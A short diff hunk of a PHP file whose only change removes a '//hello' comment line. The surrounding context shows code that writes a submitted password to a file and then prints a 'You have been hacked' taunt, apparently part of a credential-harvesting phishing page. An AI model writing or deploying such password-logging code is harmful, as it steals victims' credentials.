@@ -7,4 +7,4 @@ fwrite($file,"password = ".$password."\n");
 fclose($file);
 echo "<h1>You have been hacked hyy bro hahahahahah...</h1>"
 ?>
-//hello
+
